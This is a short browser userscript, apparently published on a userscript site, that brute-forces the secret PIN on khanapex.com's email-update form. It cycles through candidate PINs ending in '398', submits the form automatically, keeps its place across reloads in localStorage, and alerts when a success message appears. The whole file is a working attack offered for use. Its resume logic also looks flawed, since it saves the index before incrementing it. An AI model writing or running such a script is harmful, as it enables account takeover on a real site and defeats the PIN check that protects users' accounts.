// ==UserScript==
// @name         KhanApex Email PIN Brute Helper
// @namespace    https://khanapex-auto-tool.local
// @version      1.0
// @description  Automatically brute test secret PINs on khanapex.com email update form, resuming after reload.
// @match        https://khanapex.com/user*
// @run-at       document-end
// @license      MIT
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/562366/KhanApex%20Email%20PIN%20Brute%20Helper.user.js
// @updateURL https://update.greasyfork.org/scripts/562366/KhanApex%20Email%20PIN%20Brute%20Helper.meta.js
// ==/UserScript==

(function () {
  let i = parseInt(localStorage.getItem('pin_index') || '0');

  const form = document.querySelector('form[action="/user/email"]');
  if (!form) return;

  const pinInput = form.querySelector('input[name="secret_pin"]');

  const tryNext = () => {
    if (i > 999) {
      console.log("Finished all attempts — nothing left.");
      alert("All PINs tested — failed.");
      localStorage.removeItem('pin_index');
      return;
    }

    const padded = String(i).padStart(3, '0');
    const pin = padded + '398';

    pinInput.value = pin;
    console.log("Trying PIN:", pin);

    // persist state before page reload
    localStorage.setItem('pin_index', i);

    form.submit();
  };

  // Detect success
  const successMsg = document.querySelector('.notice-box .success li');
  if (successMsg && successMsg.textContent.includes('Successfully')) {
    const correctPin = String(i).padStart(3, '0') + '398';
    console.log("🎉 SUCCESS! PIN:", correctPin);
    alert("🎉 SUCCESS! Correct PIN = " + correctPin);
    localStorage.removeItem('pin_index');
    return;
  }

  // Continue brute loop
  tryNext();
  i++;
})();
